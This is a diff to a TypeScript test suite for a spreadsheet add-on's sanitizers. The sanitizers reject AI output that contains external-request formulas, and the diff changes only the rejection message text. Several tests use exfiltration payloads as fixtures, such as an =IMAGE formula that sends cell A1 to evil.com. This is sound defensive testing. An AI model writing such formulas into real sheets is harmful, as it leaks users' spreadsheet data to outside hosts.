@@ -31,7 +31,7 @@ import {
 
 describe("sanitizeForCell", () => {
   const REJECTION_MSG =
-    "[SSI Error: AI response contained an external request formula — output rejected]";
+    "[Error: AI response contained an external request formula — output rejected]";
 
   it("rejects =IMAGE formula (exfiltrates cell data via image URL)", () => {
     expect(sanitizeForCell('=IMAGE("https://evil.com/?d="&A1)')).toBe(REJECTION_MSG);
@@ -114,7 +114,7 @@ describe("writeSafeValue", () => {
     const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
     writeSafeValue(range, '=IMAGE("evil.com")');
     expect(setValueMock).toHaveBeenCalledWith(
-      "[SSI Error: AI response contained an external request formula — output rejected]",
+      "[Error: AI response contained an external request formula — output rejected]",
     );
   });
 
@@ -143,10 +143,7 @@ describe("writeSafeValueGrid", () => {
     ]);
     expect(setValuesMock).toHaveBeenCalledTimes(1);
     expect(setValuesMock).toHaveBeenCalledWith([
-      [
-        "safe text",
-        "[SSI Error: AI response contained an external request formula — output rejected]",
-      ],
+      ["safe text", "[Error: AI response contained an external request formula — output rejected]"],
       ["'=SUM(A1:A10)", "more text"],
     ]);
   });
@@ -184,7 +181,7 @@ describe("writeSafeRichText", () => {
     const written = setRichTextValueMock.mock
       .calls[0][0] as GoogleAppsScript.Spreadsheet.RichTextValue;
     expect(written.getText()).toBe(
-      "[SSI Error: AI response contained an external request formula — output rejected]",
+      "[Error: AI response contained an external request formula — output rejected]",
     );
   });
 
@@ -214,7 +211,7 @@ describe("writeSafeRichTextGrid", () => {
       .calls[0][0] as GoogleAppsScript.Spreadsheet.RichTextValue[][];
     expect(writtenSafe).toBe(safeCell);
     expect(writtenDangerous.getText()).toBe(
-      "[SSI Error: AI response contained an external request formula — output rejected]",
+      "[Error: AI response contained an external request formula — output rejected]",
     );
   });
 });
@@ -258,7 +255,7 @@ describe("writeColumn", () => {
     } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
     writeColumn(sheet, 3, ['=IMAGE("evil.com")', "safe"]);
     expect(setValuesMock).toHaveBeenCalledWith([
-      ["[SSI Error: AI response contained an external request formula — output rejected]"],
+      ["[Error: AI response contained an external request formula — output rejected]"],
       ["safe"],
     ]);
   });
@@ -339,7 +336,7 @@ describe("findOrCreateColumn", () => {
     } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
     findOrCreateColumn(sheet, '=IMAGE("evil.com")');
     expect(setValueMock).toHaveBeenCalledWith(
-      "[SSI Error: AI response contained an external request formula — output rejected]",
+      "[Error: AI response contained an external request formula — output rejected]",
     );
   });
 });
